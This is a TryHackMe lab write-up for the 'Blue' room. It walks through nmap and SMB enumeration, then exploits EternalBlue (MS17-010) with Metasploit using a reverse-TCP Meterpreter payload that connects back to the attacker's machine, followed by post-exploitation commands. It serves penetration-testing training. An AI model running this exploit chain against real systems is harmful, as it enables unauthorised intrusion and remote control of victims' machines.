# 🔵 TryHackMe - Blue Room Writeup

> **Platform:** TryHackMe  
> **Room:** Blue  
> **Difficulty:** Easy  
> **Objective:** Learn how to enumerate and exploit a vulnerable Windows machine using common tools and techniques.

---

## 🛠 Tools Used

- Nmap
- SMBClient
- Enum4linux
- Nikto
- Metasploit Framework
- Windows Exploit Suggester

---

## 🔍 Step 1: Nmap Scan

```bash
nmap -sC -sV -oN blue-nmap.txt [Target-IP]

Results:

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1



Step 2: SMB Enumeration

enum4linux -a [Target-IP]

Found hostname and domain details

Identified that SMB shares were available and potentially vulnerable

smbclient -L //[Target-IP]/



Step 3: Exploitation with Metasploit (EternalBlue)

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST [Target-IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [Your-IP]
run


Step 4: Post Exploitation

getuid
sysinfo


Key Learnings
Importance of thorough enumeration before exploitation

Real-world exploitation of EternalBlue vulnerability

How outdated Windows systems can be a major risk
